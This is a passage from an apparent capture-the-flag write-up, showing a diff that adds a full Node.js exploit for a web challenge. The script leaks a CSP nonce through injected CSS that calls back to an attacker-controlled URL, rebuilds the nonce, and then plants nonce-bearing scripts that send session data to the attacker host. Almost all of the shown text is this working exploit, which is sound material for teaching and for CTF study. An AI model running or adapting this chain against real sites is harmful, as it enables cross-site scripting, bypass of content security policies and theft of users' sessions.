@@ -141,6 +141,519 @@ This confirmed that ESI processing worked in the local environment. However, the
 | The remote run printed the flag after a `[FLAG CALLBACK]` event | The callback listener received the remote flag during the successful run. | The transcript alone is not a packet capture or a complete record of every browser request. |
 | The report endpoint returned HTTP 200 with the visited dashboard URL | The bot accepted the report and reported visiting the requested dashboard. | HTTP 200 alone would not prove exploit success; the flag callback is the stronger end-to-end evidence. |
 
+### Exploit code
+
+```
+#!/usr/bin/env node
+'use strict';
+
+// NYOOM CTF exploit
+// Target: Securinets Quals 2026
+// Requirements: Node.js 18+ and Cloudflare Tunnel
+
+const http = require('node:http');
+const crypto = require('node:crypto');
+
+const TARGET = (
+  process.env.TARGET ||
+  'http://3ff3ebf25005.inst1.securinets.tn:8080'
+).replace(/\/$/, '');
+
+const ATTACKER_URL = (process.env.ATTACKER_URL || '').replace(/\/$/, '');
+const PORT = Number(process.env.PORT || 9999);
+const MIN_TRIGRAMS = Number(process.env.MIN_TRIGRAMS || 20);
+
+if (!ATTACKER_URL || !/^https?:\/\//i.test(ATTACKER_URL)) {
+  console.error(
+    '[-] Set ATTACKER_URL to your public tunnel URL.'
+  );
+  process.exit(2);
+}
+
+let slowResponse = null;
+let slowRequested = false;
+let slowReleased = false;
+let lastCallbackAt = 0;
+const trigrams = new Set();
+let flagReceived = false;
+let flagValue = '';
+
+function log(...args) {
+  console.log(...args);
+}
+
+function randomHex(bytes) {
+  return crypto.randomBytes(bytes).toString('hex');
+}
+
+function makeLeakCss() {
+  const parts = ['* { display: block !important; }'];
+  const codes = [];
+
+  for (const a of '0123456789abcdef') {
+    for (const b of '0123456789abcdef') {
+      for (const c of '0123456789abcdef') {
+        const tri = a + b + c;
+        codes.push(tri);
+
+        parts.push(
+          `meta[http-equiv="Content-Security-Policy"]` +
+          `[content*="${tri}"] { ` +
+          `--m${tri}: url("${ATTACKER_URL}/l/${tri}"); }`
+        );
+      }
+    }
+  }
+
+  parts.push(
+    'meta[http-equiv="Content-Security-Policy"] { background-image: ' +
+    codes.map(t => `var(--m${t}, none)`).join(', ') +
+    '; }'
+  );
+
+  return parts.join('\n');
+}
+
+function recoverNonceCandidates(
+  observed,
+  maxCandidates = 256,
+  maxNodes = 700000
+) {
+  const edges = [...observed];
+
+  if (edges.length < 20) return [];
+
+  const outgoing = new Map();
+
+  for (const edge of edges) {
+    const from = edge.slice(0, 2);
+
+    if (!outgoing.has(from)) {
+      outgoing.set(from, []);
+    }
+
+    outgoing.get(from).push(edge);
+  }
+
+  for (const values of outgoing.values()) {
+    values.sort();
+  }
+
+  const allMask = (1n << BigInt(edges.length)) - 1n;
+  const edgeIndex = new Map(
+    edges.map((edge, index) => [edge, index])
+  );
+
+  const answers = new Set();
+  let visitedNodes = 0;
+
+  function dfs(path, usedMask, currentNode) {
+    if (
+      answers.size >= maxCandidates ||
+      visitedNodes++ >= maxNodes
+    ) {
+      return;
+    }
+
+    if (path.length === 30) {
+      if (usedMask === allMask) {
+        const nonce =
+          path[0] + path.slice(1).map(edge => edge[2]).join('');
+
+        if (/^[0-9a-f]{32}$/.test(nonce)) {
+          answers.add(nonce);
+        }
+      }
+
+      return;
+    }
+
+    const choices = outgoing.get(currentNode) || [];
+
+    for (const edge of choices) {
+      const index = edgeIndex.get(edge);
+      const nextMask = usedMask | (1n << BigInt(index));
+
+      const remainingSteps = 30 - (path.length + 1);
+      let unseen = 0;
+
+      for (let i = 0; i < edges.length; i++) {
+        if ((nextMask & (1n << BigInt(i))) === 0n) {
+          unseen++;
+        }
+      }
+
+      if (unseen > remainingSteps) continue;
+
+      path.push(edge);
+      dfs(path, nextMask, edge.slice(1));
+      path.pop();
+
+      if (
+        answers.size >= maxCandidates ||
+        visitedNodes >= maxNodes
+      ) {
+        return;
+      }
+    }
+  }
+
+  for (const first of edges) {
+    const index = edgeIndex.get(first);
+
+    dfs([first], 1n << BigInt(index), first.slice(1));
+
+    if (
+      answers.size >= maxCandidates ||
+      visitedNodes >= maxNodes
+    ) {
+      break;
+    }
+  }
+
+  log(
+    `[+] Trigram graph search visited ${visitedNodes} nodes; ` +
+    `candidate nonce count: ${answers.size}`
+  );
+
+  return [...answers];
+}
+
+function waitFor(predicate, timeoutMs, intervalMs = 200) {
+  return new Promise((resolve, reject) => {
+    const start = Date.now();
+
+    const timer = setInterval(() => {
+      if (predicate()) {
+        clearInterval(timer);
+        resolve();
+      } else if (Date.now() - start >= timeoutMs) {
+        clearInterval(timer);
+        reject(
+          new Error('Timed out waiting for browser callbacks.')
+        );
+      }
+    }, intervalMs);
+  });
+}
+
+async function postForm(url, cookie, fields) {
+  return fetch(url, {
+    method: 'POST',
+    headers: cookie ? { Cookie: cookie } : {},
+    body: new URLSearchParams(fields),
+    redirect: 'manual'
+  });
+}
+
+async function main() {
+  const server = http.createServer((req, res) => {
+    const u = new URL(req.url, `http://127.0.0.1:${PORT}`);
+
+    if (req.method === 'GET' && u.pathname === '/leak.css') {
+      const css = makeLeakCss();
+
+      res.writeHead(200, {
+        'Content-Type': 'text/css; charset=utf-8',
+        'Cache-Control': 'no-store, max-age=0',
+        'Access-Control-Allow-Origin': '*'
+      });
+
+      res.end(css);
+
+      log(`[+] Served leak.css (${Buffer.byteLength(css)} bytes)`);
+      return;
+    }
+
+    if (req.method === 'GET' && u.pathname === '/slow.css') {
+      slowRequested = true;
+      slowResponse = res;
+
+      res.writeHead(200, {
+        'Content-Type': 'text/css; charset=utf-8',
+        'Cache-Control': 'no-store, max-age=0',
+        'Access-Control-Allow-Origin': '*'
+      });
+
+      res.flushHeaders?.();
+
+      log(
+        '[*] slow.css requested; holding response open.'
+      );
+
+      req.on('close', () => {
+        if (!slowReleased) {
+          log('[!] Browser closed slow.css before release.');
+        }
+      });
+
+      return;
+    }
+
+    const leakMatch = u.pathname.match(/^\/l\/([0-9a-f]{3})$/);
+
+    if (req.method === 'GET' && leakMatch) {
+      const tri = leakMatch[1];
+
+      trigrams.add(tri);
+      lastCallbackAt = Date.now();
+
+      res.writeHead(204, {
+        'Cache-Control': 'no-store'
+      });
+
+      res.end();
+      return;
+    }
+
+    if (req.method === 'GET' && u.pathname === '/flag') {
+      flagReceived = true;
+      flagValue = u.searchParams.get('d') || '';
+
+      log(`\n[FLAG CALLBACK] ${flagValue}\n`);
+
+      res.writeHead(204, {
+        'Cache-Control': 'no-store'
+      });
+
+      res.end();
+      return;
+    }
+
+    res.writeHead(404, {
+      'Content-Type': 'text/plain; charset=utf-8'
+    });
+
+    res.end('not found');
+  });
+
+  await new Promise((resolve, reject) => {
+    server.once('error', reject);
+    server.listen(PORT, '0.0.0.0', resolve);
+  });
+
+  log(`[+] Attacker listener on 0.0.0.0:${PORT}`);
+  log(`[+] Callback URL: ${ATTACKER_URL}`);
+  log(`[+] Target: ${TARGET}`);
+
+  const username = 'nyoom' + randomHex(3);
+  const password = randomHex(8);
+
+  log(`[+] Registering challenge user: ${username}`);
+
+  let loginRes;
+
+  try {
+    loginRes = await postForm(
+      `${TARGET}/login`,
+      '',
+      { username, password }
+    );
+  } catch (error) {
+    server.close();
+
+    throw new Error(
+      `Could not connect to ${TARGET}/login: ${error.message}`
+    );
+  }
+
+  const setCookie = loginRes.headers.get('set-cookie') || '';
+  const cookie = setCookie.split(';')[0];
+
+  if (!cookie.startsWith('session=')) {
+    const body = await loginRes.text().catch(() => '');
+
+    server.close();
+
+    throw new Error(
+      `Login did not return a session cookie ` +
+      `(HTTP ${loginRes.status}). Response: ${body.slice(0, 300)}`
+    );
+  }
+
+  log(
+    `[+] Registered; session cookie captured (${cookie.length} chars)`
+  );
+
+  const phase1Bio =
+    `<style>@import url("${ATTACKER_URL}/leak.css");</style>` +
+    `<link rel="stylesheet" href="${ATTACKER_URL}/slow.css">`;
+
+  const bioRes = await postForm(
+    `${TARGET}/profile`,
+    cookie,
+    { bio: phase1Bio }
+  );
+
+  const bioText = await bioRes.text().catch(() => '');
+
+  if (bioRes.status < 200 || bioRes.status >= 400) {
+    server.close();
+
+    throw new Error(
+      `Could not set phase-1 bio ` +
+      `(HTTP ${bioRes.status}): ${bioText.slice(0, 300)}`
+    );
+  }
+
+  log('[+] Phase-1 bio set.');
+
+  const botUrl =
+    `http://edge:8080/dashboard?u=${encodeURIComponent(username)}`;
+
+  log(`[+] Reporting dashboard to bot: ${botUrl}`);
+
+  const reportPromise = fetch(`${TARGET}/report`, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({ url: botUrl }),
+    signal: AbortSignal.timeout(90000)
+  }).then(async response => {
+    const body = await response.text().catch(() => '');
+
+    log(
+      `[+] Report endpoint responded HTTP ${response.status}: ` +
+      body.slice(0, 250)
+    );
+  }).catch(error => {
+    log(`[!] Report request status: ${error.message}`);
+  });
+
+  try {
+    await waitFor(
+      () => slowRequested && trigrams.size >= MIN_TRIGRAMS,
+      45000
+    );
+
+    while (Date.now() - lastCallbackAt < 1200) {
+      await new Promise(resolve => setTimeout(resolve, 250));
+    }
+  } catch (error) {
+    log(`[!] ${error.message}`);
+    log(
+      `[!] slow.css requested: ${slowRequested}; ` +
+      `unique trigrams: ${trigrams.size}`
+    );
+
+    if (slowResponse && !slowReleased) {
+      slowReleased = true;
+      slowResponse.end('/* released */');
+    }
+
+    await reportPromise;
+    server.close();
+
+    throw new Error(
+      'Nonce leak did not produce enough callbacks. ' +
+      'Check the tunnel URL and target instance.'
+    );
+  }
+
+  log(`[+] Collected ${trigrams.size} unique nonce trigrams`);
+
+  const candidates = recoverNonceCandidates(trigrams);
+
+  if (!candidates.length) {
+    log('[!] Could not reconstruct a complete nonce.');
+
+    if (slowResponse && !slowReleased) {
+      slowReleased = true;
+      slowResponse.end('/* released */');
+    }
+
+    await reportPromise;
+    server.close();
+
+    throw new Error(
+      'Nonce reconstruction failed; phase 2 was not sent.'
+    );
+  }
+
+  const childScript = nonce =>
+    `<script nonce="${nonce}">` +
+    `fetch("/Fragments/session-info")` +
+    `.then(function(r){return r.text()})` +
+    `.then(function(t){` +
+    `var m=t.match(/data-session="([^"]*)"/);` +
+    `var v=m?m[1]:t;` +
+    `(new Image()).src="${ATTACKER_URL}/flag?d="+` +
+    `encodeURIComponent(v);` +
+    `});` +
+    `</script>`;
+
+  const srcdoc = candidates.map(childScript).join('');
+  const phase2Bio = `<iframe srcdoc='${srcdoc}'></iframe>`;
+
+  const phase2Res = await postForm(
+    `${TARGET}/profile`,
+    cookie,
+    { bio: phase2Bio }
+  );
+
+  const phase2Text = await phase2Res.text().catch(() => '');
+
+  if (phase2Res.status < 200 || phase2Res.status >= 400) {
+    if (slowResponse && !slowReleased) {
+      slowReleased = true;
+      slowResponse.end('/* released */');
+    }
+
+    server.close();
+
+    throw new Error(
+      `Could not set phase-2 bio ` +
+      `(HTTP ${phase2Res.status}): ${phase2Text.slice(0, 300)}`
+    );
+  }
+
+  log(
+    `[+] Phase-2 bio set using ${candidates.length} nonce candidates`
+  );
+
+  if (slowResponse && !slowReleased) {
+    slowReleased = true;
+    slowResponse.end('/* released */');
+
+    log('[+] Released slow.css');
+  } else {
+    log('[!] slow.css response was no longer available.');
+  }
+
+  const flagDeadline = Date.now() + 25000;
+
+  while (!flagReceived && Date.now() < flagDeadline) {
+    await new Promise(resolve => setTimeout(resolve, 250));
+  }
+
+  if (!flagReceived) {
+    log(
+      '[!] No flag callback received within 25 seconds. ' +
+      'Check the bot response and target behavior.'
+    );
+  }
+
+  await Promise.race([
+    reportPromise,
+    new Promise(resolve => setTimeout(resolve, 1000))
+  ]);
+
+  server.close();
+
+  if (flagReceived) {
+    log(`\n[FLAG] ${flagValue}\n`);
+  }
+}
+
+main().catch(error => {
+  console.error(`[-] ${error.stack || error.message || error}`);
+  process.exitCode = 1;
+});
+
+```
+
+
 ### Successful remote run
 
 The confirmed run used `nyoom_exploit2.js` with the target and callback URL configured for that run. The relevant terminal output was:
